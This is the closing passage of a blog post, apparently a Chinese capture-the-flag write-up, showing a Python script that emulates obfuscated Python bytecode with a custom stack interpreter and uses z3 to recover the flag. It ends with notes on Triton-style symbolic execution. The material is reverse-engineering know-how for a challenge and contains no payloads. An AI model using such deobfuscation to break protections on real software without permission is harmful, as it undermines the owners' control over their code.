<span class="number">1</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">"s"</span>:   <span class="comment"># POP_JUMP_IF_TRUE</span></div><div class="line">        <span class="keyword">if</span> flag:</div><div class="line">            n = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">            flag = <span class="number">0</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">25</span>):   <span class="comment"># BINARY_SUBSCR</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2[x1])</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        index = x1</div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">20</span>):   <span class="comment"># BINARY_MULTIPLY</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2*x1)</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">22</span>):   <span class="comment"># BINARY_MODULO</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2%x1)</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">65</span>):   <span class="comment"># BINARY_XOR</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2^x1)</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">23</span>):   <span class="comment"># BINARY_ADD</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2+x1)</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        n += add</div><div class="line"></div><div class="line">flag = []</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flag_n:</div><div class="line">    s = z3.Solver()</div><div class="line">    s.add(x)</div><div class="line">    s.check()</div><div class="line">    res = s.model()</div><div class="line">    flag.append(res[res[<span class="number">0</span>]])</div><div class="line"></div><div class="line">flag_hex = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> y <span class="keyword">in</span> flag:</div><div class="line">    flag_hex += chr(y.as_long())</div><div class="line"></div><div class="line"><span class="keyword">print</span> flag_hex.encode(<span class="string">'hex'</span>)</div></pre></td></tr></table></figure>
<p>思路挺简单的，相当于自己实现一个解释器，实现一个stack，因为我代码中的opcode不全，所以只能针对本题，还有几种思路，比如魔改dis，目前的dis是线性的翻译opcode，可以按照我脚本的思路，当遇到JUMP类指令时，也跟随跳转，但是这个不能去除混淆，混淆还是需要自己写代码去，而我上面自动跑flag的脚本思路是来源于Triton，传入的参数是未知的，就设置为符号变量，当分支判断的时候进行响应的处理，进行动态分析，这样就不需要去混淆。</p>
<p>等我把Triton研究清楚了，说不定能用Triton调试pyc？</p>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/08/29/0x38/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
